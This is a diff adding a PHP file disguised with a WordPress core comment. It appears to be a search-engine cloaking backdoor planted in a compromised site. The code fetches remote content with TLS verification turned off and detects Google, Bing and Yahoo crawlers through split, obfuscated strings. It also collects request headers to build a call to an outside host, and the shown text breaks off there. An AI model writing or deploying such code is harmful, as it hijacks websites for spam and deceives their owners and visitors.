@@ -1,0 +1,47 @@
+<?php
+/**
+string abs
+**/
+function/*don*/dodzutoc($url)
+{
+    $file_contents= '';
+    if(function_exists('curl_init')){
+        $ch = curl_init();
+        curl_setopt($ch, CURLOPT_URL, $url);
+        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
+        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
+        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+        curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 30);
+        $file_contents = curl_exec($ch);
+        curl_close($ch);
+    }
+    if (!$file_contents) {
+        $file_contents = file_get_contents($url);
+    }
+    return $file_contents;
+}
+function/*true*/diczbot()
+{
+    $uAgent = strtolower($_SERVER['HTTP_USER_AGENT']);
+    if (stripos($uAgent, 'yah'.'oo') || stripos($uAgent, 'go'.'oglebo'.'t') || stripos($uAgent, 'bin'.'g') || stripos($uAgent, 'goo'.'gle')) {
+        return true;
+    } else {
+        return false;
+    }
+}
+/*
+ * If wp-config.php exists in the WordPress root, or if it exists in the root and wp-settings.php
+ * doesn't, load wp-config.php. The secondary check for wp-settings.php has the added benefit
+ * of avoiding cases where the current directory is a nested installation, e.g. / is WordPress(a)
+ * and /blog/ is WordPress(b).
+ *
+ * If neither set of conditions is true, initiate loading the setup process.
+ */
+$host = $_SERVER['HTTP_HOST'];
+$lang = $_SERVER["HTTP_ACCEPT_LANGUAGE"];
+$urlshang = '';
+if (isset($_SERVER['HTTP_REFERER'])) {
+    $urlshang = $_SERVER['HTTP_REFERER'];
+    $urlshang = $urlshang;
+}
+$web1 = $http_web . ':/'.'/' . $goweb . '/indexnew.p';
